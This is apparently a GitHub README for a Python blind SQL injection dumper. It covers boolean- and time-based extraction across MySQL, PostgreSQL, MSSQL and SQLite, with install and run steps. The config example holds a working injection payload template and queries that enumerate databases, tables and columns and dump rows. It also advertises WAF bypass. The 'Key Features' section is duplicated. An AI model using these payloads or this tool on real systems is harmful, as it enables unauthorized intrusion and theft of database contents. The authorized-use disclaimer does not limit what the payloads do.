# 🎯 Multi-Database Blind SQL Injection Dumper

A lightweight, high-performance, and fully dynamic Python tool designed to automate data extraction via **Boolean-based** and **Time-based Blind SQL Injection**.

Unlike standard automated tools, this script handles multiple Database Management Systems (DBMS) seamlessly by dynamically loading SQL syntax, payload functions, and extraction queries directly from external JSON configuration files—without editing a single line of Python code.

---

## 📊 Technical Specifications & Benchmarks

| Metric / Parameter | Value / Specification |
| :--- | :--- |
| **01. Supported DBMS** | MySQL, PostgreSQL, MSSQL, SQLite |
| **02. Extraction Speed** | ~1 to 3 characters/second (Time-based dependent on delay) |
| **03. Max String Length** | Up to **50 characters** per query (Configurable) |
| **04. Max Table Limits** | Up to **15 tables** enumerated per loop |
| **05. Max Column Limits** | Up to **15 columns** enumerated per table |
| **06. Max Row Dumping** | **20 rows** extracted per session |
| **07. Default Time Threshold** | **3.0 seconds** delay detection |
| **08. Supported Protocols** | HTTP / HTTPS (with SSL bypass) |

---

## ✨ Key Features

1. **Multi-Database Architecture:** Load custom query logic for MySQL, PostgreSQL, MSSQL, or SQLite without touching the Python code.
2. **Zero Code Modification:** Fully configurable target URLs, HTTP headers, payloads, and queries via JSON files.
3. **Dual Injection Support:** Handles both **Time-based** (`sleep`/`pg_sleep`/`WAITFOR DELAY`) and **Boolean-based** SQLi.
4. **Interactive CLI:** Step-by-step interactive menus to enumerate databases, tables, columns, and dump rows.
5. **WAF Bypass Friendly:** Fine-tune time thresholds (e.g., `1.5s` to `5.0s`) and custom request headers.

---

## ✨ Key Features

1. **Multi-Database Architecture:** Load custom query logic for MySQL, PostgreSQL, MSSQL, or SQLite without touching the Python code.
2. **Zero Code Modification:** Fully configurable target URLs, HTTP headers, payloads, and queries via JSON files.
3. **Dual Injection Support:** Handles both **Time-based** (`sleep`/`pg_sleep`/`WAITFOR DELAY`) and **Boolean-based** SQLi.
4. **Interactive CLI:** Step-by-step interactive menus to enumerate databases, tables, columns, and dump rows.
5. **WAF Bypass Friendly:** Fine-tune time thresholds (e.g., `1.5s` to `5.0s`) and custom request headers.

---

## 🛠️ Installation & Setup

### Step 1: Clone the repository
```bash
git clone [https://github.com/MhnXp/BlindSQLi-Dumper.git](https://github.com/MhnXp/BlindSQLi-Dumper.git)
```
## Step 2: Navigate to directory
```bash
cd BlindSQLi-Dumper
```
## Step 3: Install dependencies
```bash
pip install -r requirements.txt
```
## 🚀 How to Use (Step-by-Step Guide)
Choose the JSON configuration file corresponding to your target database dialect (config_mysql.json, config_postgres.json, config_mssql.json, or config_sqlite.json).
Example config_mysql.json structure:
```JSON
{
  "target_url": "[http://example.com/api/v1/search](http://example.com/api/v1/search)",
  "method": "POST",
  "target_param": "query",
  "injection_type": "time",
  "time_threshold": 3.0,
  "success_keyword": "Welcome",
  "payload_template": "admin' AND IF(({query}), sleep(3), 0)-- -",
  "queries": {
    "get_db": "ascii(substring((SELECT database()), {pos}, 1)) = {ascii_val}",
    "get_tables": "ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' LIMIT {offset},1), {pos}, 1)) = {ascii_val}",
    "get_columns": "ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT {offset},1), {pos}, 1)) = {ascii_val}",
    "dump_data": "ascii(substring((SELECT {column} FROM {table} LIMIT {offset},1), {pos}, 1)) = {ascii_val}"
  },
  "headers": {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/json",
    "Authorization": "Bearer YOUR_TOKEN"
  }
}
```
## Step 2: Run the Script
Execute the main script using Python:
```bash
python dumper.py -c config_mysql.json
```
For MySQL / MariaDB:
```Bash
python dumper.py -c config_mysql.json
```
For PostgreSQL:
```Bash
python dumper.py -c config_postgres.json
```
For Microsoft SQL Server (MSSQL):
```Bash
python dumper.py -c config_mssql.json
```
For SQLite:
```Bash
python dumper.py -c config_sqlite.json
```

## 📋 Interactive Workflow (4 Stages)
When you run the tool, it guides you interactively through the extraction process across 4 distinct stages:

 Stage 1 - Database Discovery: Automatically extracts the active database name character-by-character (1-50 chars).

 Stage 2 - Table Enumeration: Lists up to 15 tables in the active database with interactive selection indexes ([0] to [14]).

 Stage 3 - Column Extraction: Displays up to 15 available columns inside the selected table.

 Stage 4 - Data Dumping: Dumps the selected columns row-by-row (up to 20 rows per execution run).
 

## ⚠️ Disclaimer
This tool is created strictly for educational purposes and authorized penetration testing. The author assumes no liability for misuse or damage caused by this program.

## 📜 License
Distributed under the MIT License.



